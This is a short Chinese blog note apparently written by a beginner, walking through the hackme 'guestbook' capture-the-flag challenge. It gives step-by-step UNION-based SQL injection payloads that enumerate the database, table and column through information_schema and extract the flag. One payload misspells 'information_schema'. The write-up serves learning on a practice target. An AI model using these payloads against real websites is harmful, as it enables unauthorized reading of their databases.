---
title: 点滴记录sql（一）
---
此题出自hackme：guestbook
---
这题是一个最底层的sql注入问题，可对于刚刚接触的我来说，难度也是不小，主要还是一些代码

思想：这题首先进行注入点测试：
		URL+&id=-1 union select 1,2,3,4
		发现2，3，4可以为注入点，这里我选择2，此处有一个问题，就是将URL后面改为了read,我不是很理解
	然后获取数据库名:
		URL+&id=-1 union select 1,database(),3,4
		此处获取数据库名为g8
	再获取表名：
		URL+&id=-1 union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="g8" limit 0,1),3,4
		此处获取到表名为flag
	接着获取列名：
		URL+&id=-1 union select 1,(select COLUMN_NAME from informaton_schema.COLUMNS where TABLE_NAME="flag" limit 1,1),3,4
		获取到列名为flag
	最后获取到flag:
		URL+&id=-1 union select 1,(select flag from flag limit 1,1),3,4
		得到flag
		
注:此处对于limit在哪一处取值不是很了解，目前只有随机试，详细了解的话得去仔细接触一下数据库